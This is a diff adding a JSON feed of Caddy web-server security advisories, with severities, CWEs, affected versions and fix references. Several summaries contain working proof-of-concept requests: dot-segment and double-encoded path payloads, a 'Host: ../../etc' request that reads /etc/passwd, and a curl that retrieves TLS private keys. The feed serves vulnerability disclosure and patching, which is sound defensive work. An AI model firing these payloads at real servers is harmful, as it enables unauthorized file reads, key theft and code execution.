@@ -1,0 +1,1754 @@
+{
+  "schema": "advisorydeck/v1/product-feed",
+  "generated_at": "2026-11-16T02:25:17Z",
+  "product": {
+    "slug": "caddy",
+    "name": "Caddy",
+    "category": "proxies",
+    "homepage": "https://caddyserver.com",
+    "version_scheme": "semver",
+    "branches": [
+      {
+        "name": "2",
+        "eol": false,
+        "eol_date": null,
+        "latest": "2.11.9"
+      },
+      {
+        "name": "1",
+        "eol": true,
+        "eol_date": "2020-07-01",
+        "latest": "1.0.5"
+      }
+    ]
+  },
+  "advisories": [
+    {
+      "id": "GHSA-f278-mgc7-46j3",
+      "aliases": [],
+      "title": "php_fastcgi authorization bypass via dot-segments in the request path",
+      "summary": "### Summary\r\nAn unauthenticated attacker can execute a PHP script that a Caddyfile access-control rule was protecting.\r\n\r\n> Disclosure note: This finding was identified and validated by Bynario AI, an automated pipeline. The technical claims and supporting evidence were manually reviewed before submission. The technical report was partly written using AI and re-written by me.\r\n\r\nCaddy's route matchers evaluate the `path.Clean()` cleaned request path, while the FastCGI transport derives `SCRIPT_FILENAME` from the raw path. The two therefore disagree about which file a request names: the access-control decision is made about one file, and a different file is executed.\r\n\r\n**If there is no index.php file**, `GET /admin.php/../../nope.php` or `/admin.php/..%2f..%2fnope.php` is judged by every matcher as a request for `/nope.php`. A `basic_auth` or `handle` gate on `/admin*`, `/admin.php`, or `/admin.php*` never fires while php-fpm is told to execute `/srv/admin.php`.\r\n\r\nNo access-control configuration prevents this. The matcher only ever sees a string the attacker chooses fresh on every request, so no path rule can cover it.\r\n\r\nWhere the attacker also controls a `.php` file on disk (e.g. an upload directory the operator deliberately excluded from PHP execution), this escalates from authorization bypass to remote code execution as the php-fpm user.\r\n\r\n### Details\r\n\r\n`php_fastcgi` expands to three routes (`caddy adapt` output abbreviated):\r\n\r\n``` json\r\nroute 1\r\n    { \"match\": [{\"file\": {\"try_files\": [\"{http.request.uri.path}/index.php\"]}, ...}],\r\n      \"handle\": [{\"handler\": \"static_response\", \"status_code\": 308}] }\r\n\r\nroute 2\r\n    { \"match\": [{\"file\": {\"try_files\": [\"{http.request.uri.path}\",\r\n                                        \"{http.request.uri.path}/index.php\",\r\n                                        \"index.php\"],\r\n                          \"try_policy\": \"first_exist_fallback\",\r\n                          \"split_path\": [\".php\"]}}],\r\n      \"handle\": [{\"handler\": \"rewrite\", \"uri\": \"{http.matchers.file.relative}\"}] }\r\n\r\nroute 3\r\n    { \"match\": [{\"path\": [\"*.php\"]}],\r\n      \"handle\": [{\"handler\": \"reverse_proxy\",\r\n                  \"transport\": {\"protocol\": \"fastcgi\", \"split_path\": [\".php\"]}}] }\r\n```\r\n**Caddy never rewrites `r.URL.Path` itself.** `CleanPath` is applied only to matcher-local copies for their own yes/no decisions (`matchers.go:436,487`, `urlpatternmatcher.go:118`). The rewrite in route 2 is therefore the *only* step in the entire chain that normalizes the path the transport will later read. But as said, that part never happens, so transport will receive the entire raw path.\r\n\r\n**Bug 1: the transport splits an un-normalized path**\r\n`modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go:288`\r\n\r\n    fpath := r.URL.Path          // raw; contains \"..\" as sent by the client\r\n    ...\r\n    if splitPos := t.splitPos(fpath); splitPos > -1 {\r\n        docURI   = fpath[:splitPos]\r\n        pathInfo = fpath[splitPos:]\r\n        scriptName = strings.TrimSuffix(scriptName, pathInfo)\r\n    }\r\n    scriptFilename := caddyhttp.SanitizedPathJoin(root, scriptName)\r\n\r\n`splitPos` returns the index past the end of the *first* token, so for `/admin.php/../../nope.php` `scriptName` is `/admin.php` and pathInfo becomes `/../../nope.php`. Both get sanitized, but *after* the split happens. \r\nWhat php-fpm will end up executing is `SCRIPT_FILENAME = scriptFilename`, which is `/srv/admin.php`. \r\n\r\nMeanwhile the path matcher evaluates the cleaned path = `/nope.php`, so a basic_auth or handle gate on `/admin.php` or `/admin*` never matches, and never runs.\r\n\r\n**Bug 2: `first_exist_fallback` does not fall back.**\r\n`modules/caddyhttp/fileserver/matcher.go:440-461`\r\n\r\n    for i, pattern := range m.TryFiles {\r\n        candidates := makeCandidates(pattern)\r\n        for _, c := range candidates {\r\n            // Skip the IO if using fallback policy and it's the latest item\r\n            if i == maxI {\r\n                setPlaceholders(c, false)...",
+      "published_at": "2026-11-04T01:11:26.000Z",
+      "modified_at": "2026-11-04T01:11:27.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.9,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-436",
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "2.4.6",
+              "fixed": "2.11.8"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-f278-mgc7-46j3",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-f278-mgc7-46j3",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-f278-mgc7-46j3",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:19764ec04b739d26959135bb8ba60d38219064e024907c7683bf5bcf752347b4",
+      "note": null
+    },
+    {
+      "id": "GHSA-jf74-f69g-hcj9",
+      "aliases": [],
+      "title": "file_server exposes private keys when the data directory falls back to ./caddy",
+      "summary": "### Summary\r\n\r\nWhen neither `XDG_DATA_HOME` nor `HOME` is set, `caddy.AppDataDir()` returns `./caddy`, so certificates, private keys and the local CA keys live under the working directory. `caddy file-server` and any `file_server` rooted at `.` serve them to anonymous clients when started from that directory.\r\n\r\n### Details\r\n\r\n`AppDataDir()` (`storage.go`) falls back to the relative path `./caddy` when no home directory can be found (some containers, systemd units without a home, CI runners). `caddy file-server` serves the working directory by default (`--root` defaults to the current directory), and so does a `file_server` whose root is `.`. FrankenPHP's `php-server` command has the same default root.\r\n\r\nFix: `FileServer.Provision` adds the absolute form of the data directory to `Hide` when `AppDataDir()` is relative. This covers the Caddyfile, JSON configs and the `file-server` command, the same way the Caddyfile is already hidden. Patch: public PR from `dunglas:fileserver-hide-relative-data-dir`.\r\n\r\nDiscovered by Anthropic's OSS Scanner, as vulnerability ANT-2026-JBWWW7FF.\r\n\r\n### Proof of concept\r\n\r\n```console\r\n$ cd /srv/site && env -u HOME -u XDG_DATA_HOME caddy file-server --domain localhost\r\n$ curl -k https://localhost/caddy/certificates/local/localhost/localhost.key\r\n-----BEGIN EC PRIVATE KEY-----\r\n```\r\n\r\nThe same happens with this Caddyfile, run from `/srv/site` without `HOME`:\r\n\r\n```caddyfile\r\nlocalhost {\r\n\troot .\r\n\tfile_server\r\n}\r\n```\r\n\r\n### Impact\r\n\r\nAnonymous clients download TLS private keys and the local CA's root and intermediate keys, which lets them impersonate the site or mint certificates trusted by clients that installed the local CA. Only deployments without `HOME` and `XDG_DATA_HOME` that serve their working directory are affected.",
+      "published_at": "2026-11-04T01:00:18.000Z",
+      "modified_at": "2026-11-04T01:01:41.000Z",
+      "severity": {
+        "level": "medium",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-552"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "2.0.0",
+              "fixed": "2.11.8"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-jf74-f69g-hcj9",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-jf74-f69g-hcj9",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-jf74-f69g-hcj9",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:ca840e59a5d06573df58a52345b4e52db17d791a36a8f3b6cffcfa70858754b0",
+      "note": null
+    },
+    {
+      "id": "GHSA-69hv-5jfc-mvmv",
+      "aliases": [],
+      "title": "rewrite re-decodes {http.matchers.file.remainder}, bypassing path-based deny rules",
+      "summary": "### Summary\r\n\r\nThe rewrite handler inserts `{http.matchers.file.remainder}` unescaped, then percent-decodes the rewritten URI again after the matchers already ran. A double-encoded path info such as `..%252f` becomes `../` and reaches files a path-based deny rule protects; `%3F` and `%23` in the path info replace the query string or truncate the path.\r\n\r\n### Details\r\n\r\n`{http.matchers.file.remainder}` holds decoded path text. `escapePathPlaceholders()` (`modules/caddyhttp/rewrite/rewrite.go`) escapes `{http.request.uri.path}` and `{http.matchers.file.relative}` before the rewritten URI is parsed, but not the remainder. The rewrite handler inserts it raw, cuts the result at `#` and `?`, and percent-decodes it a second time, after the matchers that ran on the original path.\r\n\r\n`try_files` with `split_path` and a rewrite to `{http.matchers.file.relative}{http.matchers.file.remainder}` is the usual setup for PHP-style path info (FrankenPHP's `php_server` generated it).\r\n\r\nFix: escape the remainder with `escapePathPreservingSlashes()`, like `{http.matchers.file.relative}`. A remainder without reserved characters, such as `/foo/bar`, is rewritten as before. Patch: public PR from `dunglas:rewrite-escape-file-remainder`.\r\n\r\nDiscovered by Anthropic's OSS Scanner, as vulnerability ANT-2026-32RAL55Q.\r\n\r\n### Proof of concept\r\n\r\n`public/index.php` and `public/private/secret.txt` exist:\r\n\r\n```caddyfile\r\n:8080 {\r\n\troot * ./public\r\n\troute {\r\n\t\t@denied path /private/*\r\n\t\terror @denied 403\r\n\t\t@php file {\r\n\t\t\ttry_files {path} index.php\r\n\t\t\tsplit_path .php\r\n\t\t}\r\n\t\trewrite @php {http.matchers.file.relative}{http.matchers.file.remainder}\r\n\t\t@phpfiles path *.php /index.php/*\r\n\t\trespond @phpfiles \"PHP route: {uri}\" 200\r\n\t\tfile_server\r\n\t}\r\n}\r\n```\r\n\r\n```console\r\n$ curl 'http://localhost:8080/index.php/..%252fprivate%252fsecret.txt'\r\nSECRET\r\n$ curl 'http://localhost:8080/index.php/x%23y?a=b'\r\nPHP route: /index.php/x?a=b\r\n$ curl 'http://localhost:8080/index.php/x%253Fa=evil?a=b'\r\nPHP route: /index.php/x%3Fa=evil?a=b\r\n```\r\n\r\nThe first request is a single opaque segment for `@denied`. After the rewrite it becomes `/index.php/../private/secret.txt`, misses the PHP route and `file_server` serves the protected file.\r\n\r\n### Impact\r\n\r\nUnauthenticated clients read static files that a path-based rule placed before the rewrite is meant to deny, on sites that rewrite to `{http.matchers.file.remainder}` (PHP-style path info). They can also change the query string or path the backend receives.",
+      "published_at": "2026-11-04T00:59:57.000Z",
+      "modified_at": "2026-11-04T01:01:50.000Z",
+      "severity": {
+        "level": "medium",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-174"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "2.0.0",
+              "fixed": "2.11.8"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-69hv-5jfc-mvmv",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-69hv-5jfc-mvmv",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-69hv-5jfc-mvmv",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:ca840e59a5d06573df58a52345b4e52db17d791a36a8f3b6cffcfa70858754b0",
+      "note": null
+    },
+    {
+      "id": "GHSA-25cw-38mq-q7m6",
+      "aliases": [],
+      "title": "file matcher resolves /file/./ to a regular file, bypassing suffix path rules",
+      "summary": "### Summary\r\n\r\n`try_files {path}` resolves `/.env/./` to the regular file `/.env`, while path matchers see `/.env/`. A rule such as `path *.env` placed before the rewrite doesn't match, and `file_server` serves the file without its canonical redirect. `php_fastcgi` and FrankenPHP's `php_server` are affected through their built-in try_files route.\r\n\r\n### Details\r\n\r\nThe `file` matcher (`modules/caddyhttp/fileserver/matcher.go`) runs `path.Clean` on each expanded candidate, which drops the trailing slash, and restores it only when the try_files pattern itself ends in `/`. So `try_files {path}` resolves `/.env/./` to the regular file `/.env` and rewrites the request to it.\r\n\r\nPath matchers see `/.env/` for that request, so suffix rules, exact paths, globs ending in a file name and `$`-anchored `path_regexp` evaluated before the rewrite don't match. `file_server` then skips its canonical redirect because `path.Base` of the original path (`.`) and of the rewritten path (`.env`) differ, and serves the file.\r\n\r\nFix: keep the trailing slash of the expanded candidate through `path.Clean`. `strictFileExists` already requires a candidate ending in `/` to be a directory, so `/.env/` and `/.env/./` no longer match the regular file, while `/dir/./` still matches the directory and `split_path` keeps working. Patch: public PR from `dunglas:fileserver-match-trailing-slash`.\r\n\r\nDiscovered by Anthropic's OSS Scanner, as vulnerability ANT-2026-VAGWNYYZ.\r\n\r\n### Proof of concept\r\n\r\n```caddyfile\r\n:8080 {\r\n\troot /srv\r\n\t@blocked path *.env\r\n\troute {\r\n\t\trespond @blocked 403\r\n\t\ttry_files {path} {path}/ /index.html\r\n\t\tfile_server\r\n\t}\r\n}\r\n```\r\n\r\n```console\r\n$ curl -i localhost:8080/.env                        # 403\r\n$ curl -i --path-as-is localhost:8080/.env/./        # 200, body of /srv/.env\r\n```\r\n\r\nThe same works with `php_fastcgi` followed by `file_server`.\r\n\r\n### Impact\r\n\r\nUnauthenticated clients read static files (`.env`, backups, configuration) that a suffix or exact path rule is meant to block. Prefix rules and `*/.*` still block. Nothing gets executed.",
+      "published_at": "2026-11-04T00:59:36.000Z",
+      "modified_at": "2026-11-04T01:01:57.000Z",
+      "severity": {
+        "level": "medium",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-41"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "2.0.0",
+              "fixed": "2.11.8"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-25cw-38mq-q7m6",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-25cw-38mq-q7m6",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-25cw-38mq-q7m6",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:ca840e59a5d06573df58a52345b4e52db17d791a36a8f3b6cffcfa70858754b0",
+      "note": null
+    },
+    {
+      "id": "GHSA-r766-rf9f-588h",
+      "aliases": [],
+      "title": "Host and :authority values with dot segments or slashes escape a {host}-based root",
+      "summary": "### Summary\r\n\r\nA site whose root uses the request host (`root /srv/sites/{host}`) lets the client choose the document root. HTTP/1.1 accepts `Host: ..`, and the HTTP/2 and HTTP/3 servers accept `/` and `\\` in `:authority`, so `../../etc` moves the root anywhere on the filesystem. `file_server` serves files and `php_fastcgi` runs `.php` files outside the intended tree.\r\n\r\n### Details\r\n\r\nWhat reaches Caddy, per protocol (Go 1.27, quic-go v0.63.0):\r\n\r\n| Host value | HTTP/1.1 (`Host` or absolute-form) | HTTP/2 `:authority` | HTTP/3 `:authority` |\r\n|---|---|---|---|\r\n| `.`, `..`, `...` | accepted | accepted | accepted |\r\n| contains `/`, `\\` or a space | 400 | accepted | accepted |\r\n| contains NUL | 400 | stream error | stream error |\r\n\r\n`httpguts.ValidHostHeader` covers only HTTP/1. The HTTP/2 and HTTP/3 servers check `:authority` with `ValidHeaderFieldValue` alone, which rejects control bytes but allows `/`, `\\` and spaces. The expanded root then goes through `FastAbs`, which cleans the dot segments instead of rejecting them. On Windows, `FastAbs` calls `GetFullPathNameW`, which also trims trailing dots and spaces from the last segment, so `...` can resolve like `.` and `.. ` like `..`.\r\n\r\nFix: `Server.serveHTTP` applies `httpguts.ValidHostHeader` to every protocol, and responds 400 when the host, port stripped, is made only of dots. Hosts such as `example.com.` keep working. Patch: public PR from `dunglas:caddyhttp-reject-path-like-host`.\r\n\r\nDiscovered by Anthropic's OSS Scanner, as vulnerability ANT-2026-YKIEF8GR.\r\n\r\n### Proof of concept\r\n\r\n```caddyfile\r\n{\r\n\tservers {\r\n\t\tprotocols h1 h2c\r\n\t}\r\n}\r\n\r\n:8080 {\r\n\troot /srv/sites/{host}\r\n\tfile_server\r\n}\r\n```\r\n\r\n```console\r\n# HTTP/1.1: the root becomes /srv, serving /srv/secret.txt\r\ncurl -H 'Host: ..' http://localhost:8080/secret.txt\r\n\r\n# HTTP/2: curl sends the Host value as :authority; the root becomes /etc\r\ncurl --http2-prior-knowledge -H 'Host: ../../etc' http://localhost:8080/passwd\r\n```\r\n\r\nBoth return 200 on master. The same works over TLS with HTTP/2 and HTTP/3.\r\n\r\n### Impact\r\n\r\nOn catch-all or on-demand TLS sites with a host-derived root, unauthenticated clients read any file the Caddy process can read and, with `php_fastcgi` or FrankenPHP, run any `.php` file on the filesystem. Sites that list their host names are not affected.",
+      "published_at": "2026-11-04T00:59:13.000Z",
+      "modified_at": "2026-11-04T01:02:03.000Z",
+      "severity": {
+        "level": "high",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-22"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "2.0.0",
+              "fixed": "2.11.8"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-r766-rf9f-588h",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-r766-rf9f-588h",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-r766-rf9f-588h",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:39202f8906e9e889d13154d2da7e42366c2f6b1af781efcdd7022a82d896fdca",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-55458",
+      "aliases": [
+        "GHSA-8qx7-j2v2-x6q5"
+      ],
+      "title": "Caddy: RFC 7230 §6.1 compliance issue / Hop-by-hop headers that leak through",
+      "summary": "Caddy is an extensible server platform that uses TLS by default. Prior to 2.11.5, the reverse proxy's finalizeResponse method in modules/caddyhttp/reverseproxy/reverseproxy.go handles an upstream 101 Switching Protocols response before running removeConnectionHeaders and the hopHeaders deletion loop used for ordinary responses. The early return invokes handleUpgradeResponse, which copies the upstream headers to the client and normalizes only WebSocket-specific header names. An attacker who controls or compromises a proxied WebSocket upstream can therefore cause hop-by-hop headers such as Alt-Svc, Keep-Alive, and Proxy-Authenticate, as well as headers named by Connection, to cross the proxy boundary. For HTTP/2 or HTTP/3 extended CONNECT, the upstream 101 response may be represented to the client as an ordinary successful response, increasing the chance that leaked headers are processed. This issue is fixed in version 2.11.5.",
+      "published_at": "2026-10-13T16:27:12.000Z",
+      "modified_at": "2026-11-09T18:23:55.505Z",
+      "severity": {
+        "level": "low",
+        "score": 2.9,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00499,
+        "percentile": 0.43331,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-444"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "2.0.0",
+              "fixed": "2.11.5"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-8qx7-j2v2-x6q5",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/commit/25b3eab6dbd8d2d2670711f26b774e0fd43e1179",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/releases/tag/v2.11.5",
+          "type": "release-notes"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-8qx7-j2v2-x6q5",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-55458",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-55458",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-55458",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-55458",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-8qx7-j2v2-x6q5",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-8qx7-j2v2-x6q5",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:e19967597ad7a8ca609864a7328e86fbe456eb389a0b8199e6d48bd44d06d090",
+      "note": null
+    },
+    {
+      "id": "GHSA-6365-7ppr-5r92",
+      "aliases": [],
+      "title": "Connection created for the wrong upstream for forward_auth + reverse_proxy",
+      "summary": "### Summary\r\nWe have found an issue where Caddy is using the wrong connection when a handler has both `forward_auth` and `reverse_proxy`. Occasionally users were mentioning requests returning with 404 for not apparent reason. Unfortunately enabling detailed Caddy logs did not help as these were not correct, insisting their upstreams were returning 404 for endpoints which are known to exist. Only `tcpdump` showed the real issue; the request meant for the `forward_auth` endpoint was being sent on the wrong connection which did not have the expected endpoints and thus replied with 404.\r\n\r\nFor our setup we have downgraded to 2.10.2 which is not affected.\r\n\r\n### Details\r\nCommit 8aca108d2c9d9e9ff3a39ff00684ea58df1338f6 seems to be the cause as the parent 156ce99d3a46be8cefe8502b2c30b757e4deb79f does not exhibit this behavior. \r\n\r\n### PoC\r\nThe issue only happened sporadically and seemingly also fixed itself sometimes when connections were likely closed. To reproduce reliably we need to make the race condition window larger by adding a sleep. We can apply it to both commits to confirm it is not the source of any issue:\r\n\r\nFor 8aca108d2c9d9e9ff3a39ff00684ea58df1338f6 (to make the race more likely):\r\n```diff\r\ndiff --git a/modules/caddyhttp/reverseproxy/httptransport.go b/modules/caddyhttp/reverseproxy/httptransport.go\r\nindex 0c4d26ee..428589c5 100644\r\n--- a/modules/caddyhttp/reverseproxy/httptransport.go\r\n+++ b/modules/caddyhttp/reverseproxy/httptransport.go\r\n@@ -268,6 +268,7 @@ func (h *HTTPTransport) NewTransport(caddyCtx caddy.Context) (*http.Transport, e\r\n        }\r\n \r\n        dialContext := func(ctx context.Context, network, address string) (net.Conn, error) {\r\n+               time.Sleep(2 * time.Millisecond) // make race more likely\r\n                // The network is usually tcp, and the address is the host in http.Request.URL.Host\r\n                // and that's been overwritten in directRequest\r\n                // However, if proxy is used according to http.ProxyFromEnvironment or proxy providers,\r\n```\r\n\r\nFor 156ce99d3a46be8cefe8502b2c30b757e4deb79f (where it will *NOT* cause issues):\r\n```diff\r\ndiff --git a/modules/caddyhttp/reverseproxy/httptransport.go b/modules/caddyhttp/reverseproxy/httptransport.go\r\nindex 3031bda4..ba05d20f 100644\r\n--- a/modules/caddyhttp/reverseproxy/httptransport.go\r\n+++ b/modules/caddyhttp/reverseproxy/httptransport.go\r\n@@ -267,6 +267,7 @@ func (h *HTTPTransport) NewTransport(caddyCtx caddy.Context) (*http.Transport, e\r\n        }\r\n \r\n        dialContext := func(ctx context.Context, network, address string) (net.Conn, error) {\r\n+               time.Sleep(2 * time.Millisecond) // make race more likely\r\n                // For unix socket upstreams, we need to recover the dial info from\r\n                // the request's context, because the Host on the request's URL\r\n                // will have been modified by directing the request, overwriting\r\n```\r\n\r\nNow, to reproduce we use this Caddyfile:\r\n```Caddyfile\r\n{\r\n\tauto_https disable_redirects\r\n\tadmin off\r\n\tlog default {\r\n\t\tlevel ERROR\r\n\t}\r\n}\r\n\r\n:18888 {\r\n\t@svc path /svc/*\r\n\thandle @svc {\r\n\t\tforward_auth localhost:16060 {\r\n\t\t\turi /verify?id=x&sig=y\r\n\t\t\ttransport http {\r\n\t\t\t\tkeepalive_idle_conns_per_host 1000\r\n\t\t\t}\r\n\t\t}\r\n\t\turi strip_prefix /svc\r\n\t\treverse_proxy localhost:18080 {\r\n\t\t\ttransport http {\r\n\t\t\t\tkeepalive_idle_conns_per_host 1000\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\thandle {\r\n\t\trespond \"not found\" 404\r\n\t}\r\n}\r\n```\r\n\r\nAnd then we have a program which causes it to happen:\r\n- Listens on the expected `forward_auth` endpoint\r\n- Listens on the expected `reverse_proxy` endpoint, counting if it receives a `/verify` (which it definitely should not)\r\n- Requests `/svc/ping` from Caddy which we expect to hit the `forward_auth` with a `/verify` and then the `reverse_proxy` with a `/ping`\r\n\r\n```go\r\npackage main\r\n\r\nimport (\r\n\t\"context\"\r\n\t\"io\"\r\n\t\"log/slog\"\r\n\t\"net/http\"\r\n\t\"os\"\r\n\t\"os/signal\"\r\n\t\"sync\"\r\n\t\"sync/atomic\"\r\n\t\"time\"\r\n)\r\n\r\nconst (\r\n\tauthAddr = \"127.0.0.1:16060\"                 /...",
+      "published_at": "2026-07-10T17:08:10.000Z",
+      "modified_at": "2026-07-10T17:08:11.000Z",
+      "severity": {
+        "level": "medium",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.11.5"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-6365-7ppr-5r92",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-6365-7ppr-5r92",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-6365-7ppr-5r92",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:b85e0a10a197970d83468b384ab135b28256d0ef220fecd9f1b85f87f81fe304",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-77281",
+      "aliases": [
+        "CVE-2026-92284",
+        "CVE-2026-92700",
+        "GHSA-j8px-rmrx-76h9"
+      ],
+      "title": "Caddy: rewrite placeholder re-expansion",
+      "summary": "Caddy is an extensible server platform that uses TLS by default. In version 2.11.3 and earlier, three configuration-dependent weaknesses affect the handler and placeholder layer. In modules/caddyhttp/rewrite/rewrite.go, Rewrite.Rewrite() can pass attacker-controlled replacement bytes through buildQueryString for a second placeholder expansion when a rewrite URI ends with a literal question mark, allowing injected environment or request-variable placeholders to disclose data and, when the file provider is registered, allowing injected file placeholders to disclose readable files. The  issue is fixed in version 2.11.4.",
+      "published_at": "2026-07-10T15:22:04.000Z",
+      "modified_at": "2026-09-23T19:23:08.504Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00491,
+        "percentile": 0.42776,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-94",
+        "CWE-178",
+        "CWE-770"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "2.0.0",
+              "fixed": "2.11.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-j8px-rmrx-76h9",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/pull/7761",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/commit/176b043b0104cee3f894023cd5a598ac29e404bb",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/releases/tag/v2.11.4",
+          "type": "release-notes"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-77281",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-j8px-rmrx-76h9",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-77281",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-77281",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-92284",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-92284",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-92700",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-92700",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-77281",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-77281",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-92284",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-92284",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-92700",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-92700",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-j8px-rmrx-76h9",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-j8px-rmrx-76h9",
+          "license": "CC-BY-4.0"
+        }
+      ],
